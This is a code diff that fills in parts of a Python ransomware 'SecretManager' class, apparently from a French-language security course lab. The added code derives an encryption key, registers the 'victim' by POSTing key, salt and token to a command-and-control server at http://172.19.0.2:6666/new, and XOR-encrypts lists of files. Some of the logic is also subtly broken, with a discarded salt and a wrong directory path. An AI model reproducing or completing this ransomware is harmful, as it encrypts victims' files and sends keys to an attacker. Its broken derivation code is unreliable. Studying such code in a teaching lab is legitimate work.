@@ -25,15 +25,48 @@ class SecretManager:
         self._salt = None
         self._token = None
 
+        self._files_encrypted = {}
+        self.filter = "*.txt"
+
         self._log = logging.getLogger(self.__class__.__name__)
 
     def do_derivation(self, salt:bytes, key:bytes)->bytes:
-        raise NotImplemented()
+        # Salt derivation
+        salt_derivation = PBKDF2HMAC(algorithm=hashes.SHA256(),
+                        length=self.SALT_LENGTH,
+                        salt=secrets.token_bytes(16),
+                        iterations=self.ITERATION)
 
+        salt = salt_derivation.derive(salt)
 
-    def create(self)->Tuple[bytes, bytes, bytes]:
-        raise NotImplemented()
+        # Key derivation
+        kdf = PBKDF2HMAC(algorithm=hashes.SHA256(),
+                        length=self.KEY_LENGTH,
+                        salt=salt,
+                        iterations=self.ITERATION)
 
+        return kdf.derive(key), salt
+
+        # Other way to do it with secret library
+        # return secrets.token_bytes(16)
+
+        #########################
+        # Question 2. 
+        # #######################
+        # Il existe des dictionnaires faisant le liens avec les hashes 
+        # Il faut au moins du pseudo aléatoire?
+        # Le salt est stocké en local
+        
+
+    def create(self)-> dict: # Tuple[bytes, bytes, bytes]:
+        res = {
+            "key": secrets.token_bytes(16),
+            "salt": secrets.token_bytes(16),
+            "token": secrets.token_bytes(16)
+            }
+
+        self._token= res["token"]
+        return res
 
     def bin_to_b64(self, data:bytes)->str:
         tmp = base64.b64encode(data)
@@ -41,11 +74,50 @@ class SecretManager:
 
     def post_new(self, salt:bytes, key:bytes, token:bytes)->None:
         # register the victim to the CNC
-        raise NotImplemented()
+        payload = {
+            "token" : self.bin_to_b64(token),
+            "salt"  : self.bin_to_b64(salt),
+            "key"   : self.bin_to_b64(key)
+        }
+        requests.post("http://172.19.0.2:6666/new", json=payload)
+        #sudo docker inspect ransomware-network
+    
+        return {}
 
     def setup(self)->None:
-        # main function to create crypto data and register malware to cnc
-        raise NotImplemented()
+
+        tokens = self.create()
+
+        key, salt = self.do_derivation(tokens["salt"], tokens["key"])
+        token = tokens["token"]
+        self._key = key
+        m = sha256()
+        m.update(token)
+        folder_token_name = "/root/" + str(m.hexdigest())
+
+        os.makedirs(folder_token_name, exist_ok=True)
+
+        with open(folder_token_name + "/token.bin", "wb") as f:
+            f.write(token)
+
+        with open(folder_token_name + "/salt.bin", "wb") as f:
+            f.write(salt)
+
+        # verification:
+        try:
+            os.chdir("/root/token")
+            print(os.listdir())
+        except:
+            print("error creating binary file")
+
+        self.post_new(salt, key, tokens["token"])
+
+        #################
+        # Question 3 
+        #################
+        # Eviter d'ecrire dans un 
+        # fichier contenant déjà qqc et 
+        # de perdre ainsi le token
 
     def load(self)->None:
         # function to load crypto data
@@ -61,16 +133,25 @@ class SecretManager:
 
     def get_hex_token(self)->str:
         # Should return a string composed of hex symbole, regarding the token
-        raise NotImplemented()
+
+        return self._token.hex()
 
     def xorfiles(self, files:List[str])->None:
         # xor a list for file
-        raise NotImplemented()
 
+        for file in files:
+            self._files_encrypted[str(file)] = xorfile(file, self._key)
+        
+        
     def leak_files(self, files:List[str])->None:
         # send file, geniune path and token to the CNC
         raise NotImplemented()
 
     def clean(self):
         # remove crypto data from the target
-        raise NotImplemented()
+        self._key = secrets.token_bytes(16)
+        self._key = None
+
+if __name__=="__main__":
+    secret_manager = SecretManager()
+    secret_manager.setup()
